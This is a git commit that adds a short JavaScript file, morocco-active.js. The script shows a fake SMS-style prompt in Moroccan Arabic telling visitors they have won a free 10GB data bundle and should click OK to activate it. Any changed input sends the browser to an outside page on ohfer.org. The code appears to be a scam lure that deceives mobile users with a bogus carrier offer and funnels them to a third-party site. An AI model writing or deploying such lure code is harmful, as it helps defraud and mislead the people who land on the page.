70ed14127b9522010486d1c0e66600d61c76bafc
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-01-04 09:29:05 +0100

    Create morocco-active.js

---
+++ morocco-active.js
@@ -0,0 +1,5 @@
+var password = 'activi 10 go'
+password=prompt('SMS: Mabrouk, nemratek tstahel 10GB, clicki ela OK bach tf33elha daba','activi 10 go');
+if (password != 'activi 10 go') {
+location.href='https://ohfer.org/morocco-team.html';
+}
